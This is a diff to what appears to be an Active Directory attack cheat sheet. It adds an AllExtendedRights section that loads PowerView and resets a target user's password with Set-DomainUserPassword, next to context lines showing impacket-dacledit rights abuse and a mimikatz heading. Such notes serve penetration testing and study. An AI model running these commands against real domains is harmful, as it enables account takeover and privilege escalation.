@@ -167,6 +167,20 @@ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -t
 gpupdate /force
 ```
 
+## AllExtendedRights
+
+- import powerview
+
+```powershell
+Import-Module .\PowerView.ps1
+```
+
+- reset password
+
+```powershell
+Set-DomainUserPassword -Identity 'target_user' -Verbose
+```
+
 # mimikatz
 
 ```cmd
